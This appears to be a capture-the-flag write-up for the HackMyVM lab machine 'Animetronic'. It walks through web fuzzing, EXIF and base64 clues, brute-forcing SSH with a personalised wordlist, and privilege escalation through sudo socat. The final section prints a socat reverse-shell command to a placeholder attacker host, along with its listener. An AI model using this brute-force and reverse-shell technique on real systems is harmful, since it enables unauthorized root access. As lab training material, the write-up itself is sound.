# Animetronic - A HackMyVM Machine

## Enumeration
MACHINE IP: `***MACHINE IP***`

On bruteforcing subdomains we get the following:
1. js
2. css
3. img
4. staffpages
5. server-status

staffpages is 403 forbidden but by using a tool called 403bypasser we get this output

```
GET --> http://192.168.0.104                                                                        STATUS: 200 SIZE: 2384
Header= {'X-Original-URL': '/staffpages'}

GET --> http://192.168.0.104                                                                        STATUS: 200 SIZE: 2384
Header= {'X-Rewrite-URL': '/staffpages'}
```

So let's add these headers in burpsuite and see if we can gain access to this page.

This didnt work. But fuzzing subdomains in the /startpages directory revealed a `new_employees` page.

We find an image here. Now we can save this image and use exiftool to get its exif data.

```
ExifTool Version Number         : 12.76
File Name                       : new_employees.jpeg
Directory                       : .
File Size                       : 160 kB
File Modification Date/Time     : 2024:05:05 11:24:09+05:30
File Access Date/Time           : 2024:05:05 11:24:09+05:30
File Inode Change Date/Time     : 2024:05:05 11:24:09+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
Image Width                     : 703
Image Height                    : 1136
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 703x1136
Megapixels                      : 0.799
```
By decrypting this, which is just base64, we get this: ***ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן***

Now, this is just the string `message_for_michael` written upside down.

Navigating to the `/staffpages/message_for_michael/` directory we get some stuff written there.

And, it says that there is a file called `personal_info.txt`

Let's see what's in it.

*File contents*:

```
name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 " Ahmed - Yasser - Adam "

Hobbies: swimming 
```
## Initial Access

On reading the file, I get a hunch that what we're looking at is a way to bruteforce the ***ssh*** login.
I am going to simply assume that the username is michael.
So we need to come up with a wordlist to try and guess the password, based on what we have here in `personal_info.txt`

After Generating a wordlist with *cupp.py* we get the credentials
***michael:leahcim1996***

On log in, you can cd to the <u>henry</u> home file, which gives the *user flag*.

Now, on reading the Note.txt file, and decrypting the given base64 string, we get that the password is stored in <u>henrypassword.txt</u>.

The new obtained credentials are as follows:
***henry:IHateWilliam***

Log in as henry.

## Privilege Escalation

By running:
 
```bash
sudo -l
```

We find that *socat* can be run as root. So let's spawn a reverse shell, so that we can get a root shell out of it.

On the target machine run this command:

```bash
sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker_ip:attacker_port
```

And on the attacker machine run:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

This will spawn a root shell and allow us to gain access as *root*.
